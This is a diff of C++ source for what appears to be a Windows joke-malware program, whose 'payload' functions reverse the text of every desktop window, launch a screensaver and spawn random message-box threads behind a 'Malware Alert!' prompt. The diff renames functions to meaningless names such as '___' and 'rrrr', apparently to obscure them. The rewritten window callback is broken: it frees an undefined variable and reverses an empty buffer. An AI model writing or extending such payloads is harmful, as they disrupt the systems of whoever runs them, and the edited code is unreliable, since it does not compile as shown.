@@ -65,7 +65,7 @@ LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
     return CallNextHookEx(0, nCode, wParam, lParam);
 }
 
-DWORD WINAPI ripMessageThread(LPVOID parameter) {
+DWORD WINAPI ___(LPVOID parameter) {
     HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
     std::string lol = gen_random();
     std::string lol2 = gen_random();
@@ -74,7 +74,7 @@ DWORD WINAPI ripMessageThread(LPVOID parameter) {
     return 0;
 }
 
-void strReverseW(LPWSTR str) {
+void rrrr(LPWSTR str) {
     int len = lstrlenW(str);
     if (len <= 1)
         return;
@@ -87,18 +87,15 @@ void strReverseW(LPWSTR str) {
     }
 }
 
-BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
-    LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);
-    if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL)) {
-        strReverseW(str);
-        SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
-    }
+BOOL CALLBACK _EnumProc(HWND hwnd, LPARAM lParam) {
+    LPWSTR a = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8500);
+    rrrr(a);
     GlobalFree(str);
     return TRUE;
 }
 
 int payloadChangeText() {
-    EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);
+    EnumChildWindows(GetDesktopWindow(), &_EnumProc, NULL);
     return 1;
 }
 
@@ -296,7 +293,7 @@ If you do want to execute, press Yes at your own risk.", "Malware Alert!", MB_YE
     ShellExecuteA(NULL, "open", "bubbles.scr", NULL, NULL, 10);
     quit_flag = true;
     for (int i = 0; i < 10; i++) {
-        CreateThread(NULL, 4096, &ripMessageThread, NULL, NULL, NULL);
+        CreateThread(NULL, 4096, &___, NULL, NULL, NULL);
         Sleep(500);
         x = rand() % (1920);
         y = rand() % (1080);
